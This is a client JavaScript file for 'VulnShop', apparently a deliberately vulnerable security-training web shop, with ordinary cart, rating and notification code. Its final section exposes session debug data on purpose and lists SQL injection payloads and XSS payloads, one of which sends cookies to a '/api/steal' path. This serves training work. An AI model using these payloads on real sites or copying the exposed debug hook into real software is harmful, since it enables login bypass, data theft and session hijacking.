// VulnShop Client JavaScript

// ── Cart Count ───────────────────────────────────────────────
function updateCartCount() {
  fetch('/cart')
    .then(r => r.text())
    .then(html => {
      const match = html.match(/cart-item[^"]*"/g);
      const count = match ? match.length : 0;
      const el = document.getElementById('cartCount');
      if (el) el.textContent = count;
    })
    .catch(() => {});
}

// Update on load
document.addEventListener('DOMContentLoaded', () => {
  updateCartCount();

  // Star rating interactive
  document.querySelectorAll('.star-pick').forEach((star, idx, stars) => {
    star.style.color = idx < 5 ? '#FF9900' : '#ccc';
    star.addEventListener('mouseover', () => {
      stars.forEach((s, i) => s.style.color = i <= idx ? '#FF9900' : '#ccc');
    });
    star.addEventListener('mouseout', () => {
      const val = parseInt(document.getElementById('ratingInput')?.value || 5);
      stars.forEach((s, i) => s.style.color = i < val ? '#FF9900' : '#ccc');
    });
  });

  // Auto-hide alerts
  setTimeout(() => {
    document.querySelectorAll('.alert').forEach(a => {
      a.style.transition = 'opacity 0.5s';
      a.style.opacity = '0';
      setTimeout(() => a.remove(), 500);
    });
  }, 5000);

  // Image error fallback
  document.querySelectorAll('img[onerror]').forEach(img => {
    img.addEventListener('error', function() {
      if (!this.dataset.fallbackTried) {
        this.dataset.fallbackTried = 'true';
        this.src = `https://picsum.photos/seed/${Math.random()}/400/300`;
      }
    });
  });
});

// ── Toast Notification ───────────────────────────────────────
function showToast(message, type = 'success') {
  const toast = document.createElement('div');
  toast.style.cssText = `
    position:fixed;bottom:20px;right:20px;z-index:9999;
    background:${type==='success'?'#28a745':'#dc3545'};color:white;
    padding:12px 20px;border-radius:8px;font-size:14px;
    box-shadow:0 4px 12px rgba(0,0,0,0.3);
    animation:slideIn 0.3s ease;
  `;
  toast.textContent = message;
  document.body.appendChild(toast);
  setTimeout(() => { toast.style.opacity='0'; setTimeout(()=>toast.remove(),300); }, 3000);
}

// ── Debug Helper (intentionally exposed) ─────────────────────
window.vulnshop = {
  version: '1.0.0',
  debug: true,
  // VULNERABILITY: Session info exposed in JS global
  getSession: () => fetch('/debug').then(r=>r.json()),
  // Helpful payloads for training
  payloads: {
    sqli_login: "admin'--",
    sqli_union: "' UNION SELECT 1,flag_value,3,4,5,6,7,8,9,10,11 FROM flags-- -",
    xss_basic: "<script>alert(document.cookie)<\/script>",
    xss_img: "<img src=x onerror=\"fetch('/api/steal?c='+document.cookie)\">",
    xss_stored: "<img src=x onerror=\"fetch('/api/xss-flag?src=review')\">",
  }
};

console.log('%cVulnShop Security Training', 'font-size:18px;font-weight:bold;color:#FF9900');
console.log('%c⚠️ This application contains intentional vulnerabilities', 'color:red;font-weight:bold');
console.log('%c🎯 Challenge hints available at: /api/challenges', 'color:#007185');
console.log('%c🐛 Debug info: window.vulnshop.getSession()', 'color:#007185');
console.log('%c💉 SQLi payload: ' + window.vulnshop.payloads.sqli_login, 'color:#856404;background:#fff3cd;padding:2px');
